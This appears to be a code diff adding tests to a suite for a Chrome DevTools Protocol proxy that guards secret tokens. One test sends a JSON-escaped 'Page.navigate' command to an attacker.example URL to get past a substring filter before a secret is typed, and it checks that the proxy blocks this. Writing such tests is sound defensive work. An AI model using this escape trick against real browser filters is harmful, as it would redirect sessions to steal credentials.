@@ -127,6 +127,28 @@ describe('CDP proxy', () => {
     expect(upstream.received.join('')).not.toContain('real-secret-42');
   });
 
+  // Attack: hide Page.navigate from the substring pre-filter with a JSON escape.
+  it('treats a JSON-escaped Page.navigate as a navigation', async () => {
+    const sid = await setup();
+    const tok = tokenStore.issue('site:password', 'real-secret-42', { sessionId: sid, allowedHosts: hosts('login.example.com') }).id;
+    await navigated('https://login.example.com/signin');
+    client.send('{"id":2,"sessionId":"T1","method":"Page\\u002enavigate","params":{"url":"https://attacker.example/"}}');
+    const errP = once<Buffer>(client, 'message');
+    client.send(JSON.stringify({ id: 3, sessionId: 'T1', method: 'Input.insertText', params: { text: tok } }));
+    expect(JSON.parse((await errP).toString()).error.message).toContain('a navigation is in progress');
+    await new Promise(r => setTimeout(r, 50));
+    expect(upstream.received.join('')).not.toContain('real-secret-42');
+  });
+
+  it('closes with a client still connected, revoking its session tokens', async () => {
+    const sid = await setup();
+    tokenStore.issue('site:password', 'real-secret-42', { sessionId: sid });
+    await proxy.close();
+    await new Promise(r => setTimeout(r, 50));
+    expect(tokenStore.sessionValues(sid)).toHaveLength(0);
+    expect(cdpSessionStore.has(sid)).toBe(false);
+  });
+
   it('redacts an inbound echo-back of the real value', async () => {
     const sid = await setup();
     tokenStore.issue('site:password', 'real-secret-42', { sessionId: sid });
